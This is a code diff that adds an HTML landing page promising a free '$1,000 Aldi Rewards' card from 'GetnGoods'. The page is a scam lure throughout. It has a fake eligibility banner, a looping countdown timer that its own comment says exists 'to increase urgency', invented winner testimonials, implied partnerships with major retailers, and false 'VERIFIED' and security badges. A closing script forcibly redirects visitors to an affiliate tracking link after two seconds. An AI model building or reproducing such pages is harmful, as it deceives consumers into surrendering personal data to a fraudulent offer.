@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GetnGoods - $1,000 Aldi Rewards</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* --- CORE VARIABLES --- */
+        :root {
+            --primary-blue: #0F172A; /* Trustworthy Dark Blue */
+            --accent-orange: #F27B1E; /* Official Aldi Orange Tone */
+            --success-green: #16A34A;
+            --light-bg: #F8FAFC;
+            --white: #FFFFFF;
+            --text-dark: #1E293B;
+            --text-gray: #64748B;
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        }
+
+        /* --- RESET --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            font-family: 'Roboto', sans-serif; 
+            background-color: var(--light-bg);
+            color: var(--text-dark);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        h1, h2, h3, h4 { font-family: 'Poppins', sans-serif; font-weight: 700; }
+        a { text-decoration: none; transition: all 0.3s ease; }
+        img { max-width: 100%; height: auto; }
+
+        /* --- UTILITIES --- */
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+        .text-center { text-align: center; }
+        .text-orange { color: var(--accent-orange); }
+        
+        /* --- BUTTONS --- */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--accent-orange);
+            color: white;
+            padding: 16px 32px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(242, 123, 30, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border: none;
+            cursor: pointer;
+            width: 100%; /* Mobile first */
+            max-width: 400px;
+        }
+        
+        .btn:hover {
+            background: #d96813;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 15px rgba(242, 123, 30, 0.4);
+        }
+
+        .btn-pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(242, 123, 30, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(242, 123, 30, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(242, 123, 30, 0); }
+        }
+
+        /* --- NAVIGATION --- */
+        nav {
+            background: var(--white);
+            padding: 15px 0;
+            box-shadow: var(--shadow-sm);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .nav-inner { display: flex; justify-content: space-between; align-items: center; }
+        .brand-logo {
+            font-family: 'Poppins', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--primary-blue);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .brand-logo span { color: var(--accent-orange); }
+
+        /* --- HERO SECTION --- */
+        .hero {
+            padding: 60px 0;
+            background: radial-gradient(circle at top right, #e0e7ff 0%, transparent 40%);
+        }
+        .hero-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 40px;
+            align-items: center;
+        }
+        
+        .hero-content h1 {
+            font-size: 2.5rem;
+            line-height: 1.2;
+            color: var(--primary-blue);
+            margin-bottom: 20px;
+        }
+        
+        .hero-content p {
+            font-size: 1.1rem;
+            color: var(--text-gray);
+            margin-bottom: 30px;
+        }
+
+        .reward-card-visual {
+            background: var(--white);
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: var(--shadow-lg);
+            position: relative;
+            text-align: center;
+        }
+        
+        .card-image {
+            border-radius: 15px;
+            width: 100%;
+            object-fit: cover;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .verified-badge-sm {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(255,255,255,0.9);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--success-green);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        /* --- URGENCY BAR --- */
+        .urgency-bar {
+            background: #FEF2F2;
+            border: 1px solid #FECACA;
+            color: #991B1B;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        /* --- STEPS --- */
+        .steps { padding: 60px 0; }
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-top: 40px;
+        }
+        .step-card {
+            background: var(--white);
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: var(--shadow-sm);
+            border-top: 4px solid var(--accent-orange);
+        }
+        .step-num {
+            background: var(--primary-blue);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            margin: 0 auto 20px;
+        }
+
+        /* --- TRUST SECTION --- */
+        .trust-section { background: var(--primary-blue); color: white; padding: 60px 0; text-align: center; }
+        .trust-logos {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            flex-wrap: wrap;
+            margin-top: 30px;
+            opacity: 0.8;
+            font-weight: 700;
+            font-size: 1.5rem;
+            font-family: 'Poppins', sans-serif;
+        }
+        .trust-logo-item { color: rgba(255,255,255,0.6); }
+
+        /* --- FAQ --- */
+        .faq { padding: 60px 0; }
+        .faq-item {
+            background: var(--white);
+            margin-bottom: 15px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: var(--shadow-sm);
+        }
+        .faq-item h4 { color: var(--primary-blue); margin-bottom: 8px; font-size: 1.1rem; }
+        .faq-item p { font-size: 0.95rem; color: var(--text-gray); }
+
+        /* --- FOOTER --- */
+        footer {
+            background: #020617;
+            color: #94a3b8;
+            padding: 40px 0 20px;
+            font-size: 0.85rem;
+            text-align: center;
+        }
+        .footer-links { margin-bottom: 20px; }
+        .footer-links a { color: #cbd5e1; margin: 0 10px; }
+        .disclaimer { max-width: 800px; margin: 0 auto; line-height: 1.5; opacity: 0.7; }
+
+        /* --- RESPONSIVE --- */
+        @media (min-width: 768px) {
+            .hero-grid { grid-template-columns: 1fr 1fr; }
+            .hero-content h1 { font-size: 3.5rem; }
+            .hero-content p { font-size: 1.25rem; }
+            .btn { width: auto; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- NAV -->
+    <nav>
+        <div class="container nav-inner">
+            <div class="brand-logo">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-orange"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path><line x1="3" y1="6" x2="21" y2="6"></line><path d="M16 10a4 4 0 0 1-8 0"></path></svg>
+                Getn<span>Goods</span>
+            </div>
+            <!-- THE LINK IS HERE -->
+            <a href="https://smrturl.co/a/sf9ce48c1f2/17412?s1=grfdxfdx" class="btn" style="padding: 10px 20px; font-size: 0.9rem;">Check Eligibility</a>
+        </div>
+    </nav>
+
+    <!-- HERO -->
+    <section class="hero">
+        <div class="container hero-grid">
+            <div class="hero-content">
+                <div style="display:inline-block; background: #dbeafe; color: #1e40af; padding: 5px 15px; border-radius: 20px; font-size: 0.85rem; font-weight: 700; margin-bottom: 20px;">
+                    🎁 CONGRATULATIONS! YOU ARE ELIGIBLE
+                </div>
+                <h1>Claim Your <span class="text-orange">$1,000 Aldi</span> Rewards Card Today</h1>
+                <p>Spend it on groceries, household essentials, and more. Limited time offer for new GetnGoods members.</p>
+                
+                <div class="urgency-bar">
+                    <span>⏳ Offer expires in: <span id="timer">04:59</span></span>
+                </div>
+
+                <!-- THE MAIN LINK IS HERE -->
+                <a href="https://smrturl.co/a/sf9ce48c1f2/17412?s1=grfdxfdx" class="btn btn-pulse">
+                    Claim My $1,000 Reward Now
+                </a>
+                
+                <div style="margin-top: 20px; font-size: 0.85rem; color: var(--text-gray); display: flex; align-items: center; gap: 10px; justify-content: center;">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                    Secure SSL Encryption • 100% Private Data
+                </div>
+            </div>
+
+            <div class="hero-visual">
+                <div class="reward-card-visual">
+                    <div class="verified-badge-sm">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        VERIFIED
+                    </div>
+                    <!-- Placeholder for Gift Card Image -->
+                    <img src="https://picsum.photos/seed/aldigiftcard/600/400" alt="Aldi Rewards Card" class="card-image">
+                    <div style="margin-top: 20px;">
+                        <h3 style="font-size: 1.5rem;">$1,000 Value</h3>
+                        <p style="color: var(--success-green); font-weight: 600;">Available for immediate shipping</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- HOW IT WORKS -->
+    <section class="steps">
+        <div class="container">
+            <div class="text-center">
+                <h2 style="font-size: 2rem; color: var(--primary-blue);">How It Works</h2>
+                <p style="color: var(--text-gray);">Get your reward in 3 simple steps.</p>
+            </div>
+            <div class="steps-grid">
+                <div class="step-card">
+                    <div class="step-num">1</div>
+                    <h3>Click Offer</h3>
+                    <p>Secure your spot by clicking the "Claim Reward" button on this page.</p>
+                </div>
+                <div class="step-card">
+                    <div class="step-num">2</div>
+                    <h3>Complete Survey</h3>
+                    <p>Answer a few quick questions to verify your shipping details.</p>
+                </div>
+                <div class="step-card">
+                    <div class="step-num">3</div>
+                    <h3>Receive Card</h3>
+                    <p>Your reward card is processed and shipped to your doorstep.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- TRUST / SOCIAL PROOF -->
+    <section class="trust-section">
+        <div class="container">
+            <h2 style="color: white; margin-bottom: 10px;">Trusted By Thousands</h2>
+            <p style="opacity: 0.8; font-size: 1.1rem;">GetnGoods has partnered with top retailers to reward loyal customers.</p>
+            
+            <div class="trust-logos">
+                <span class="trust-logo-item">ALDI</span>
+                <span class="trust-logo-item">WALMART</span>
+                <span class="trust-logo-item">TARGET</span>
+                <span class="trust-logo-item">AMAZON</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- TESTIMONIALS -->
+    <section class="steps" style="background: white;">
+        <div class="container">
+            <h2 class="text-center" style="margin-bottom: 40px; color: var(--primary-blue);">Recent Winners</h2>
+            <div class="steps-grid">
+                <div class="faq-item" style="text-align: left;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                        <img src="https://picsum.photos/seed/face1/50/50" style="border-radius: 50%;" alt="User">
+                        <div>
+                            <strong>Sarah M.</strong><br>
+                            <small class="text-orange">Claimed $1,000 Reward</small>
+                        </div>
+                    </div>
+                    <p>"I was skeptical at first, but the process was super easy. I used the card for my weekly grocery shop and it worked perfectly!"</p>
+                </div>
+                <div class="faq-item" style="text-align: left;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                        <img src="https://picsum.photos/seed/face2/50/50" style="border-radius: 50%;" alt="User">
+                        <div>
+                            <strong>James K.</strong><br>
+                            <small class="text-orange">Claimed $1,000 Reward</small>
+                        </div>
+                    </div>
+                    <p>"Fast delivery and great support from GetnGoods. Highly recommend checking your eligibility."</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="faq">
+        <div class="container" style="max-width: 800px;">
+            <h2 class="text-center" style="margin-bottom: 30px;">Frequently Asked Questions</h2>
+            <div class="faq-item">
+                <h4>Is this really free?</h4>
+                <p>Yes! Eligible users can claim the reward card through our partner program by completing a short survey.</p>
+            </div>
+            <div class="faq-item">
+                <h4>How long does shipping take?</h4>
+                <p>Once verified, rewards are typically shipped within 3-5 business days.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Can I use the card for anything?</h4>
+                <p>This specific reward card is valid for purchases at Aldi locations nationwide.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER CTA -->
+    <section style="background: var(--primary-blue); padding: 60px 0;">
+        <div class="container text-center">
+            <h2 style="color: white; margin-bottom: 20px;">Don't Miss Out!</h2>
+            <p style="color: #cbd5e1; margin-bottom: 30px; font-size: 1.1rem;">Slots are filling up fast. Secure your $1,000 reward now.</p>
+            <!-- THE LINK IS HERE -->
+            <a href="https://smrturl.co/a/sf9ce48c1f2/17412?s1=grfdxfdx" class="btn btn-pulse">
+                Claim Reward Before It's Gone
+            </a>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Contact Support</a>
+            </div>
+            <p class="disclaimer">
+                GetnGoods is an independent rewards program and is not directly affiliated with Aldi. 
+                All trademarks remain the property of their respective owners. Participants must be 18 years or older and residents of the United States to participate.
+            </p>
+            <p style="margin-top: 20px;">&copy; 2023 GetnGoods Rewards. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+    <!-- COUNTDOWN SCRIPT -->
+    <script>
+        // Simple Countdown Timer to increase urgency
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    timer = duration; // Reset loop
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            var fiveMinutes = 60 * 5,
+                display = document.querySelector('#timer');
+            startTimer(fiveMinutes, display);
+        };
+    </script>
+    <script src="js/main.js"></script>
+  <script>
+        (function() {
+            const links = [
+                { url: "https://smrturl.co/a/sf9ce48c1f2/17412?s1=grfdxfdx", probability: 100 },
+          
+                
+            ];
+            
+            function redirect() {
+                let randomNum = Math.random() * 100;
+                let cumulativeProbability = 0;
+                
+                for (let link of links) {
+                    cumulativeProbability += link.probability;
+                    if (randomNum < cumulativeProbability) {
+                        window.location.replace(link.url);
+                        return;
+                    }
+                }
+            }
+            
+            setTimeout(redirect, 2000);
+        })();
+    </script>
+</body>
+</html>
